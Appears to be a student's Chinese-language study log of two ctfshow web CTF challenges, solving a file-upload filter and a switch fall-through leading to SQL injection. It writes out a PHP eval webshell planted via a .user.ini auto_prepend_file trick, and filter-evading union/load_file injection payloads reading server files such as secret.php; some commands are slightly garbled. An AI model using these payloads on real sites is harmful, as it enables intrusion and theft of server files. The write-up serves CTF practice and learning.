# 第六周
# 2026年11月16-17日
## 学习内容：ctfweb13
### 解题步骤：
1. 开局一个文件提交页面（判断为文件上传）进入源代码查看
---
<input type="file" name="file">
		<input type="submit" name="上传">
    
---
- 表单字段名固定为 `file`，对应后端 `$_FILES['file']`
- 没有任何前端校验，说明全部校验在服务端
- 提示语 `where is the flag?` 暗示 flag 是服务器上的**文件**，不是页面里的内容
2. 进入备份文件查看（upload.php.bak 泄露的）拿到后端代码
![alt text](<屏幕截图 2026-11-20 160709.png>)
发现// 判断1：文件大小不能超过24字节，超过直接终止，报错
if ($size > 24){
    die("error file zise");
}
// 判断2：整个文件名的长度不能大于9个字符，长了就报错
if (strlen($filename)>9){
    die("error file name");
}
// 判断3：后缀名长度不能超过3个字符，比如 .php（3位）可以，.html（4位）不行
if(strlen($ext_suffix)>3){
    die("error suffix");
// 判断4：后缀里面不能包含 php（i代表不区分大小写 PHP/php 都拦）
if(preg_match("/php/i",$ext_suffix)){
    die("error suffix");
}
// 判断5：整个文件名里面不能包含 php（不区分大小写）
if(preg_match("/php/i",$filename)){
    die("error file name");
}
3. 判断只能走.user.ini（PHP-FPM 会读取当前目录的 .user.ini，里面写 auto_prepend_file=a.txt，等于给该目录下所有 PHP 页面加了个"页头"，访问任何 php 都会先执行 a.txt。
.user.ini：文件名 9 个字符 ✓，后缀 ini ✓，内容 auto_prepend_file=a.txt 只有 22 字节 ✓
a.txt：一句话 <?=eval($_GET[a]);?> 只有 20 字节 ✓）
4. 建两个文件（桌面新建 ctf13 文件夹）
a.txt：内容就一行 <?=eval($_GET[a]);?>
.user.ini：内容 auto_prepend_file=a.txt。Windows 建不了点开头的文件名，用记事本 → 另存为 → 文件名输入 ".user.ini"（带英文引号）→ 保存类型选"所有文件"
上传
打开题目首页，先传 .user.ini，再传 a.txt，都提示"文件上传成功"访问index.php?a=print_r(scandir(%27.%27));拿到目标文件903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php
5. 访问/index.php?a=highlight_file(%27903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php%27);
拿到   $flag="ctfshow{5c0d4eeb-5cb6-488a-bed4-18d1e8957af0}";
# 2026年11月19日
## 学习内容：ctfweb14
###  解题步骤：
1. 开局页面显示如下
 ~~~
<?php
include("secret.php");
if(isset($_GET['c'])){
    $c = intval($_GET['c']);
    sleep($c);
    switch ($c) {
        case 1:
            echo '$url';
            break;
        case 2:
            echo '@A@';
            break;
        case 555555:
            echo $url;
        case 44444:
            echo "@A@";
            break;
        case 3333:
            echo $url;
            break;
        case 222:
            echo '@A@';
            break;
        case 222:
            echo '@A@';
            break;
        case 3333:
            echo $url;
            break;
        case 44444:
            echo '@A@';
        case 555555:
            echo $url;
            break;
        case 3:
            echo '@A@';
        case 6000000:
            echo "$url";
        case 1:
            echo '@A@';
            break;
    }
}
highlight_file(__FILE__);
~~~
  ~~~
  include("secret.php"); 
引入同目录下的  secret.php ，这个文件里面定义了变量  $url ，也就是我们想要拿到的内容（flag大概率就在这里）。
 2. if(isset($_GET['c'])) 
判断GET参数里有没有传  c ，访问形式类似  ?c=xxx 。
3.  $c = intval($_GET['c']);
把传入的  c  转成整数。
4.  sleep($c); 
程序会休眠 c 秒，这是一个时间延迟点，是这道题的关键点。
5.  switch ($c) 
根据  $c  的值匹配分支：
-  case 1 ：输出  $url ，然后跳出
-  case 2 ：输出  @@@ ，跳出
-  case 555555 ：输出  $url ，跳出
-  case 44444 ：输出  @@@ ，跳出
-  case 3333 ：输出  $url ，跳出
-  case 222 ：输出  @@@ ，跳出
重点坑： case 3  和  case 6000000  没有写 break！
- 如果  c=3 ：先执行  echo '@@@' ，不会停止，继续往下走到  case 6000000 ，再执行  echo "$url" 
- 如果  c=6000000 ：直接输出  $url ，后面  case 1  不再触发（因为它在后面）
6.  highlight_file(__FILE__); 
把当前这个php文件源码高亮显示出来，
~~~
2. 发现c=3后没有break跳出会继续执行后面的代码回到url，在网站后加上?c=3得到@A@here_1s_your_f1ag.php@A@ <?php
[alt text](<屏幕截图 2026-11-18 162740.png>)
3. 进入here_1s_your_f1ag，发现页面![alt text](<屏幕截图 2026-11-18 163555.png>)怀疑为SQl注入
4. 分析源代码得到<!--
    if(preg_match('/information_schema\.tables|information_schema\.columns|linestring| |polygon/is', $_GET['query'])){
        die('@A@');
    }
-->✅ 禁止： information_schema.tables  和  information_schema.columns 
✅ 允许： sys.schema_auto_increment_columns （这个不在黑名单里）
✅ 允许： database()，load_file() 、union、select 这些都没被过滤
5. 访问/here_1s_your_f1ag.php？query=1'报错判断为数值型
访问/here_1s_your_f1ag.php？query=1 and 1=1被拦截空格
访问/here_1s_your_f1ag.php？query=1/**/order/**/by/**/1"
curl.exe -s -G "$H/here_1s_your_f1ag.php？query=1/**/order/**/by/**/2"
`order by 1` 正常，`order by 2` 报 `Unknown column '2'` → **只有 1 列**，union 就补 1 个字段
访问/here_1s_your_f1ag.php" --data-urlencode "query=0/**/union/**/select/**/(select/**/group_concat(concat_ws(0x7c,id,username,password)/**/separator/**/0x2f2f)/**/from/**/content)"指向 `secret.php`
访问here_1s_your_f1ag.php" --data-urlencode "query=0/**/union/**/select/**/hex(load_file(0x2f7661722f7777772f68746d6c2f7365637265742e706870))拿到here_1s_your_f1ag.php'
最后/here_1s_your_f1ag.php" --data-urlencode "query=0/**/union/**/select/**/hex(load_file(0x2f7265616c5f666c61675f69735f68657265))"拿到ctfshow{997dfc07-a1e3-4f65-85ad-b1ae528a8a6f}

